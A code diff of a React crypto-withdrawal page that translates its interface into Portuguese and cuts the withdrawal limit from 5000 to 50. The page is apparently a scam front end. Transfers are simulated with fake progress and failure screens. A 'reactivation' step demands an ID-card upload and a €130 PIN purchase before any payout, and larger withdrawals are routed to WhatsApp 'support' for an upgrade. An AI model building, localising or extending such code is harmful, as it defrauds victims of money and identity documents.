@@ -14,8 +14,8 @@ import { getCurrencySymbol } from '../utils/currency';
 import { ADMIN_WHATSAPP } from '../data/mockData';
 import API from '../utils/axios';
 
-// ✅ WITHDRAWAL LIMIT – users can withdraw up to this amount
-const WITHDRAWAL_LIMIT = 5000;
+// ✅ LIMITE DE SAQUE – usuários podem sacar até este valor
+const WITHDRAWAL_LIMIT = 50;
 
 const Withdraw = () => {
   const navigate = useNavigate();
@@ -27,28 +27,28 @@ const Withdraw = () => {
   const [walletBalance, setWalletBalance] = useState(0);
   const [kycStatus, setKycStatus] = useState('checking');
 
-  // Transfer simulation states
+  // Estados da simulação de transferência
   const [showTransferModal, setShowTransferModal] = useState(false);
   const [transferProgress, setTransferProgress] = useState(0);
   const [transferStatus, setTransferStatus] = useState('pending');
   const [isRetry, setIsRetry] = useState(false);
   const progressInterval = useRef(null);
 
-  // Reactivation modal states
+  // Estados do modal de reativação
   const [showReactivationModal, setShowReactivationModal] = useState(false);
   const [reactivationPin, setReactivationPin] = useState('');
   const [pinError, setPinError] = useState('');
   const [isVerifyingPin, setIsVerifyingPin] = useState(false);
 
-  // ID card upload state
+  // Estado de upload do documento de identidade
   const [idCardFile, setIdCardFile] = useState(null);
   const [idError, setIdError] = useState('');
   const idInputRef = useRef(null);
 
-  // ✅ Upgrade limit modal state
+  // ✅ Estado do modal de upgrade de limite
   const [showUpgradeModal, setShowUpgradeModal] = useState(false);
 
-  // PIN from env or fallback
+  // PIN do env ou valor padrão
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';
 
   const currencySymbol = getCurrencySymbol(user?.currency);
@@ -61,7 +61,7 @@ const Withdraw = () => {
           setKycStatus(response.data.data.status);
         }
       } catch (error) {
-        console.error('KYC status check error:', error);
+        console.error('Erro ao verificar status do KYC:', error);
         setKycStatus('error');
       }
     };
@@ -74,7 +74,7 @@ const Withdraw = () => {
         const wallet = await walletService.getWallet();
         setWalletBalance(wallet.balance || 0);
       } catch (error) {
-        console.error('Failed to fetch wallet:', error);
+        console.error('Falha ao buscar carteira:', error);
       }
     };
     fetchData();
@@ -107,7 +107,7 @@ const Withdraw = () => {
           progressInterval.current = null;
           setTransferProgress(100);
           setTransferStatus('complete');
-          toast.success('Withdrawal completed successfully!');
+          toast.success('Saque concluído com sucesso!');
           return;
         }
         setTransferProgress(progress);
@@ -135,38 +135,38 @@ const Withdraw = () => {
 
     const amountNum = parseFloat(amount);
 
-    // ✅ Step 1: Validate amount
+    // ✅ Passo 1: Validar valor
     if (!amount || amountNum < 1) {
-      toast.error('Please enter a valid amount');
+      toast.error('Digite um valor válido');
       return;
     }
 
-    // ✅ Step 2: KYC verification check
+    // ✅ Passo 2: Verificação de KYC
     if (kycStatus !== 'verified') {
-      toast.error('KYC verification required. Please complete your KYC to withdraw.');
+      toast.error('Verificação KYC necessária. Complete seu KYC para sacar.');
       return;
     }
 
-    // ✅ Step 3: Balance check
+    // ✅ Passo 3: Verificação de saldo
     if (amountNum > walletBalance) {
-      toast.error('Insufficient balance');
+      toast.error('Saldo insuficiente');
       return;
     }
 
-    // ✅ Step 4: Address check
+    // ✅ Passo 4: Verificação de endereço
     if (!address) {
-      toast.error('Please enter a wallet address');
+      toast.error('Digite um endereço de carteira');
       return;
     }
 
-    // ✅ Step 5: Withdrawal limit check
+    // ✅ Passo 5: Verificação do limite de saque
     if (amountNum > WITHDRAWAL_LIMIT) {
-      // Amount exceeds limit → show upgrade modal
+      // Valor excede o limite → mostra modal de upgrade
       setShowUpgradeModal(true);
       return;
     }
 
-    // ✅ Step 6: Within limit → proceed with transfer simulation
+    // ✅ Passo 6: Dentro do limite → prossegue com a simulação de transferência
     setIsRetry(false);
     proceedWithdrawal(amountNum);
   };
@@ -177,7 +177,7 @@ const Withdraw = () => {
       await new Promise(resolve => setTimeout(resolve, 800));
       setShowTransferModal(true);
     } catch (error) {
-      toast.error(error.response?.data?.message || 'Withdrawal failed');
+      toast.error(error.response?.data?.message || 'Falha no saque');
     } finally {
       setLoading(false);
     }
@@ -189,7 +189,7 @@ const Withdraw = () => {
         type: 'withdrawal',
         amount: parseFloat(amount),
         currency: 'USD',
-        description: `Withdrawal to ${crypto} wallet`,
+        description: `Saque para carteira ${crypto}`,
         metadata: {
           cryptoCurrency: crypto,
           walletAddress: address,
@@ -197,7 +197,7 @@ const Withdraw = () => {
         status: 'pending',
       });
     } catch (error) {
-      console.error('Finalize withdrawal error:', error);
+      console.error('Erro ao finalizar saque:', error);
     }
   };
 
@@ -216,11 +216,11 @@ const Withdraw = () => {
 
     const validTypes = ['image/jpeg', 'image/png', 'image/jpg', 'application/pdf'];
     if (!validTypes.includes(file.type)) {
-      toast.error('Invalid file format. Use JPG, PNG or PDF.');
+      toast.error('Formato de arquivo inválido. Use JPG, PNG ou PDF.');
       return;
     }
     if (file.size > 5 * 1024 * 1024) {
-      toast.error('File must be at most 5MB.');
+      toast.error('O arquivo deve ter no máximo 5MB.');
       return;
     }
 
@@ -235,13 +235,13 @@ const Withdraw = () => {
 
   const handleVerifyPin = () => {
     if (!idCardFile) {
-      setIdError('Please upload your ID card.');
+      setIdError('Por favor, envie seu documento de identidade.');
       return;
     }
     setIdError('');
 
     if (!reactivationPin.trim()) {
-      setPinError('Please enter the reactivation PIN.');
+      setPinError('Por favor, insira o PIN de reativação.');
       return;
     }
 
@@ -257,9 +257,9 @@ const Withdraw = () => {
         setIsVerifyingPin(false);
         setIsRetry(true);
         setShowTransferModal(true);
-        toast.success('Account reactivated. Completing transfer...');
+        toast.success('Conta reativada. Concluindo transferência...');
       } else {
-        setPinError('Invalid PIN. Please try again.');
+        setPinError('PIN inválido. Tente novamente.');
         setReactivationPin('');
         setIsVerifyingPin(false);
       }
@@ -269,7 +269,7 @@ const Withdraw = () => {
   const handleCloseSuccess = async () => {
     setShowTransferModal(false);
     await finalizeWithdrawal();
-    toast.success('Withdrawal request submitted!');
+    toast.success('Solicitação de saque enviada!');
     navigate('/transactions');
   };
 
@@ -279,9 +279,9 @@ const Withdraw = () => {
 
   const isKycVerified = kycStatus === 'verified';
 
-  // WhatsApp support link for upgrade modal
+  // Link do WhatsApp para o modal de upgrade
   const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
-    `Hello, I would like to upgrade my withdrawal limit. My current request of $${parseFloat(amount || 0).toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
+    `Olá, gostaria de aumentar meu limite de saque. Minha solicitação atual de $${parseFloat(amount || 0).toLocaleString()} excede o limite de $${WITHDRAWAL_LIMIT.toLocaleString()}.`
   )}`;
 
   return (
@@ -289,8 +289,8 @@ const Withdraw = () => {
       <Navbar />
       <div className="p-4 sm:p-6 max-w-2xl mx-auto">
         <div className="mb-6">
-          <h1 className="text-2xl sm:text-3xl font-bold text-white">Withdraw Funds</h1>
-          <p className="text-slate-400 mt-1">Withdraw your earnings</p>
+          <h1 className="text-2xl sm:text-3xl font-bold text-white">Sacar Fundos</h1>
+          <p className="text-slate-400 mt-1">Saque seus ganhos</p>
         </div>
 
         <motion.div
@@ -300,16 +300,16 @@ const Withdraw = () => {
         >
           <div className="bg-slate-900 rounded-lg p-4 mb-6">
             <div className="flex justify-between items-center">
-              <span className="text-slate-400">Available Balance</span>
+              <span className="text-slate-400">Saldo Disponível</span>
               <span className="text-xl font-bold text-white">{formatCurrency(walletBalance)}</span>
             </div>
           </div>
 
-          {/* Withdrawal Limit Info */}
+          {/* Informação do Limite de Saque */}
           <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-center gap-3">
             <FaInfoCircle className="text-blue-500 text-sm flex-shrink-0" />
             <p className="text-blue-400 text-sm">
-              Your withdrawal limit is <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> per request.
+              Seu limite de saque é de <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong> por solicitação.
             </p>
           </div>
 
@@ -318,15 +318,15 @@ const Withdraw = () => {
               <FaLock className="text-yellow-500 text-sm" />
               <p className="text-yellow-400 text-sm">
                 {kycStatus === 'pending'
-                  ? 'Your KYC is pending approval. Please wait for verification.'
-                  : 'KYC verification required to withdraw. Please complete your KYC first.'}
+                  ? 'Seu KYC está pendente de aprovação. Aguarde a verificação.'
+                  : 'Verificação KYC necessária para sacar. Complete seu KYC primeiro.'}
               </p>
             </div>
           )}
 
           <form onSubmit={handleSubmit} className="space-y-6">
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Select Cryptocurrency</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">Selecione a Criptomoeda</label>
               <div className="grid grid-cols-3 sm:grid-cols-5 gap-2">
                 {cryptos.map((c) => (
                   <button
@@ -347,7 +347,7 @@ const Withdraw = () => {
             </div>
 
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Amount ({user?.currency || 'USD'})</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">Valor ({user?.currency || 'USD'})</label>
               <div className="relative">
                 <span className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-400">
                   {currencySymbol}
@@ -356,7 +356,7 @@ const Withdraw = () => {
                   type="number"
                   value={amount}
                   onChange={(e) => setAmount(e.target.value)}
-                  placeholder="Enter amount"
+                  placeholder="Digite o valor"
                   min="1"
                   step="0.01"
                   className="w-full bg-slate-900 border border-slate-700 rounded-lg pl-8 pr-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
@@ -364,18 +364,18 @@ const Withdraw = () => {
               </div>
               {parseFloat(amount) > WITHDRAWAL_LIMIT && (
                 <p className="text-red-400 text-xs mt-1">
-                  Amount exceeds your withdrawal limit of {formatCurrency(WITHDRAWAL_LIMIT)}.
+                  O valor excede seu limite de saque de {formatCurrency(WITHDRAWAL_LIMIT)}.
                 </p>
               )}
             </div>
 
             <div>
-              <label className="block text-slate-300 text-sm font-medium mb-2">Wallet Address</label>
+              <label className="block text-slate-300 text-sm font-medium mb-2">Endereço da Carteira</label>
               <input
                 type="text"
                 value={address}
                 onChange={(e) => setAddress(e.target.value)}
-                placeholder="Enter your wallet address"
+                placeholder="Digite o endereço da sua carteira"
                 className="w-full bg-slate-900 border border-slate-700 rounded-lg px-4 py-3 text-white placeholder-slate-500 focus:outline-none focus:border-blue-500 transition"
               />
             </div>
@@ -389,7 +389,7 @@ const Withdraw = () => {
                 <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
               ) : (
                 <>
-                  <FaArrowDown className="text-sm" /> Request Withdrawal
+                  <FaArrowDown className="text-sm" /> Solicitar Saque
                 </>
               )}
             </button>
@@ -397,7 +397,7 @@ const Withdraw = () => {
         </motion.div>
       </div>
 
-      {/* ✅ UPGRADE LIMIT MODAL */}
+      {/* ✅ MODAL DE UPGRADE DE LIMITE */}
       <AnimatePresence>
         {showUpgradeModal && (
           <motion.div
@@ -419,21 +419,21 @@ const Withdraw = () => {
               </div>
 
               <h3 className="text-xl font-bold text-white text-center mb-2">
-                Withdrawal Limit Exceeded
+                Limite de Saque Excedido
               </h3>
 
               <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal request of{' '}
+                Sua solicitação de saque de{' '}
                 <strong className="text-white">{formatCurrency(parseFloat(amount) || 0)}</strong>{' '}
-                exceeds your current limit of{' '}
+                excede seu limite atual de{' '}
                 <strong className="text-white">{formatCurrency(WITHDRAWAL_LIMIT)}</strong>.
               </p>
 
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  To upgrade your withdrawal limit, please contact our support team. They will guide
-                  you through the account upgrade process.
+                  Para aumentar seu limite de saque, entre em contato com nossa equipe de suporte.
+                  Eles irão orientá-lo através do processo de upgrade da conta.
                 </p>
               </div>
 
@@ -442,7 +442,7 @@ const Withdraw = () => {
                   onClick={() => setShowUpgradeModal(false)}
                   className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                 >
-                  Cancel
+                  Cancelar
                 </button>
                 <a
                   href={whatsappUpgradeLink}
@@ -451,20 +451,20 @@ const Withdraw = () => {
                   className="flex-1 py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
                   <FaWhatsapp className="text-lg" />
-                  Contact Support
+                  Falar com Suporte
                 </a>
               </div>
 
               <div className="mt-3 flex items-center justify-center gap-2 text-xs text-slate-500">
                 <FaHeadset className="text-slate-500" />
-                <span>Support is available 24/7</span>
+                <span>Suporte disponível 24/7</span>
               </div>
             </motion.div>
           </motion.div>
         )}
       </AnimatePresence>
 
-      {/* TRANSFER SIMULATION MODAL */}
+      {/* MODAL DE SIMULAÇÃO DE TRANSFERÊNCIA */}
       <AnimatePresence>
         {showTransferModal && (
           <motion.div
@@ -498,15 +498,15 @@ const Withdraw = () => {
               </div>
 
               <h3 className="text-xl font-bold text-white mb-2">
-                {transferStatus === 'pending' && 'Processing Transfer...'}
-                {transferStatus === 'failed' && 'Transfer Failed'}
-                {transferStatus === 'complete' && 'Transfer Complete!'}
+                {transferStatus === 'pending' && 'Processando Transferência...'}
+                {transferStatus === 'failed' && 'Falha na Transferência'}
+                {transferStatus === 'complete' && 'Transferência Concluída!'}
               </h3>
 
               <p className="text-sm text-slate-400 mb-4">
-                {transferStatus === 'pending' && 'Moving funds from broker wallet to your destination wallet.'}
-                {transferStatus === 'failed' && 'The transfer could not be completed. Please try again.'}
-                {transferStatus === 'complete' && 'Your funds have been sent successfully!'}
+                {transferStatus === 'pending' && 'Movendo fundos da carteira do corretor para sua carteira de destino.'}
+                {transferStatus === 'failed' && 'A transferência não pôde ser concluída. Por favor, tente novamente.'}
+                {transferStatus === 'complete' && 'Seus fundos foram enviados com sucesso!'}
               </p>
 
               <div className="w-full bg-slate-700 rounded-full h-3 mb-2 overflow-hidden">
@@ -528,7 +528,7 @@ const Withdraw = () => {
                   onClick={handleRetry}
                   className="w-full py-3 rounded-lg bg-gradient-to-r from-blue-600 to-indigo-600 text-white font-semibold hover:opacity-90 transition-all"
                 >
-                  Try Again
+                  Tentar Novamente
                 </button>
               )}
 
@@ -537,7 +537,7 @@ const Withdraw = () => {
                   onClick={handleCloseSuccess}
                   className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition-all"
                 >
-                  Done
+                  Concluir
                 </button>
               )}
             </motion.div>
@@ -545,7 +545,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* REACTIVATION MODAL */}
+      {/* MODAL DE REATIVAÇÃO */}
       <AnimatePresence>
         {showReactivationModal && (
           <motion.div
@@ -567,22 +567,22 @@ const Withdraw = () => {
               </div>
 
               <h3 className="text-xl font-bold text-white text-center mb-2">
-                Account Reactivation Required
+                Reativação de Conta Necessária
               </h3>
 
               <div className="mb-4 p-3 bg-orange-500/10 border border-orange-500/30 rounded-lg flex items-start gap-3">
                 <FaInfoCircle className="text-orange-400 text-sm mt-0.5 flex-shrink-0" />
                 <p className="text-orange-300 text-xs leading-relaxed">
-                  For security, please upload your ID card and enter your reactivation PIN.
-                  A reactivation PIN costs{' '}
-                  <strong className="text-orange-200">€130.00</strong> and must be purchased
-                  before completing this withdrawal.
+                  Por segurança, por favor envie seu documento de identidade e insira seu PIN de
+                  reativação. Um PIN de reativação custa{' '}
+                  <strong className="text-orange-200">€130,00</strong> e deve ser adquirido
+                  antes de concluir este saque.
                 </p>
               </div>
 
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
-                  Upload ID Card
+                  Enviar Documento de Identidade
                 </label>
 
                 {!idCardFile ? (
@@ -592,7 +592,7 @@ const Withdraw = () => {
                   >
                     <FaUpload className="w-5 h-5 text-slate-500 mb-1" />
                     <span className="text-xs text-slate-400">
-                      Click to upload (JPG, PNG, PDF – max 5MB)
+                      Clique para enviar (JPG, PNG, PDF – máx 5MB)
                     </span>
                     <input
                       id="idCardInput"
@@ -627,7 +627,7 @@ const Withdraw = () => {
 
               <div className="mb-4">
                 <label className="block text-slate-300 text-sm font-medium mb-2">
-                  Reactivation PIN
+                  PIN de Reativação
                 </label>
                 <div className="relative">
                   <FaKey className="absolute left-3 top-1/2 transform -translate-y-1/2 text-slate-500" />
@@ -635,7 +635,7 @@ const Withdraw = () => {
                     type="password"
                     value={reactivationPin}
                     onChange={(e) => setReactivationPin(e.target.value)}
-                    placeholder="Enter PIN"
+                    placeholder="Digite o PIN"
                     maxLength="6"
                     className={`w-full bg-slate-900 border ${
                       pinError ? 'border-red-500' : 'border-slate-700'
@@ -652,7 +652,7 @@ const Withdraw = () => {
                   onClick={() => setShowReactivationModal(false)}
                   className="flex-1 py-3 rounded-lg border border-slate-700 text-slate-300 font-medium hover:bg-slate-700/50 transition"
                 >
-                  Cancel
+                  Cancelar
                 </button>
                 <button
                   onClick={handleVerifyPin}
@@ -662,7 +662,7 @@ const Withdraw = () => {
                   {isVerifyingPin ? (
                     <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin"></div>
                   ) : (
-                    'Reactivate'
+                    'Reativar'
                   )}
                 </button>
               </div>
